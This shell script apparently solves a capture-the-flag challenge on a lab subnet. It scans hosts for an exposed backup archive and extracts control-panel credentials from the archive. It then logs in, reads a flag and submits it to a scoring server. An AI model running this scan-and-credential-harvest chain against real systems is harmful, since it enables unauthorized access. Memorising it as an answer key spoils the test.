#!/bin/sh
set -eu

challenge_id='scl-challenge-frame-10bebb'
scan_output=$(nmap -n -p 80 --open -oG - 172.20.0.141-199)

for host in $(printf '%s\n' "$scan_output" | awk '/80\/open/{print $2}'); do
    base="http://$host"
    archive_path=$(curl -fsS "$base/" | python3 -c 'import re,sys; s=sys.stdin.read(); m=re.search(r"href=[\"\x27]([^\"\x27]*ops-backup\.zip)[\"\x27]", s); print(m.group(1) if m else "")')
    [ -n "$archive_path" ] || continue
    curl -fsS "$base$archive_path" -o /tmp/ghost-ops.zip
    credentials=$(python3 - <<'PY'
from configparser import ConfigParser
from zipfile import ZipFile
config = ConfigParser()
with ZipFile('/tmp/ghost-ops.zip') as archive:
    config.read_string(archive.read('relay.ini').decode())
print(config['control']['username'] + ':' + config['control']['password'])
PY
)
    username=${credentials%%:*}
    password=${credentials#*:}
    control_page=$(curl -fsS --user "$username:$password" "$base/control/")
    record_path=$(printf '%s' "$control_page" | python3 -c 'import re,sys; s=sys.stdin.read(); m=re.search(r"href=[\"\x27]([^\"\x27]*record\.txt)[\"\x27]", s); print(m.group(1) if m else "")')
    [ -n "$record_path" ] || continue
    flag=$(curl -fsS --user "$username:$password" "$base$record_path" | tr -d '\r\n')
    [ -n "$flag" ] || continue
    python3 -c 'import json,sys; print(json.dumps({"challenge_id":sys.argv[1],"task_id":"task1","flag":sys.argv[2]}))' "$challenge_id" "$flag" > /tmp/ghost-submit.json
    curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary @/tmp/ghost-submit.json
    exit 0
done

printf '%s\n' 'Ghost Paste was not found on the challenge range.' >&2
exit 1
